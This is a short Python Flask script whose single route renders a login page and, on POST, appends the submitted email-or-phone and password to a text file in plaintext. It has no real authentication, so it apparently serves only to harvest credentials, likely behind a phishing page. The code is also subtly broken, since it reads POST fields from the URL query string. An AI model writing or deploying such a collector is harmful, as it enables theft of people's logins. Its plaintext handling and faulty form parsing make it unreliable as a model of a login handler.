from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email_or_phone = request.args.get('email_or_phone')
        password = request.args.get('password')

        if email_or_phone and password:
            with open('data.txt', 'a') as file:
                file.write(f"Email or phone: {email_or_phone}\n")
                file.write(f"Password: {password}\n")
                file.write("-------------------------\n")

            return "Data stored successfully!"

    return render_template('index.html')

if __name__ == '__main__':
    app.run()
